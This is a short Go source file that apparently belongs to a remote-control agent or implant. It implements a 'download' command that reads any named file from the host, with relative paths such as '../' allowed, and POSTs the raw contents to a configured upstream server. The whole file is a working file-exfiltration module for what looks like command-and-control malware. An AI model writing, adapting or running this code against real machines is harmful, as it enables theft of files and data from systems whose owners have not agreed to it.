package rbcmd

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"path/filepath"
	config "redbull"
)

type DownloadCommand struct{}

func (c *DownloadCommand) Help() string {
	return "Download a file from this computer: download <filename>"
}

func (c *DownloadCommand) Execute(ctx *Context, cmd string) (string, string, error) {
	// Join the current directory with the command path
	filePath := filepath.Join(*ctx.CWD, cmd)

	// Resolve to absolute path (handles relative paths like ../..)
	absPath, err := filepath.Abs(filePath)
	if err != nil {
		return "", "", fmt.Errorf("failed to resolve path '%s': %w", filePath, err)
	}

	// Open the file using the full path
	file, err := os.Open(absPath)
	if err != nil {
		return "", "", fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	// Then, read the file contents
	contents, err := io.ReadAll(file)
	if err != nil {
		return "", "", fmt.Errorf("failed to read file: %w", err)
	}

	// Upload them to the server
	downloadUrl := fmt.Sprintf("%s/download", config.UPSTREAM)
	downloadResponse, err := ctx.HttpClient.Post(downloadUrl, "application/octet-stream", bytes.NewBuffer(contents))
	if err != nil {
		return "", "", fmt.Errorf("failed to download file: %w", err)
	}
	defer downloadResponse.Body.Close()

	return fmt.Sprintf("downloaded file %s", absPath), "", nil
}
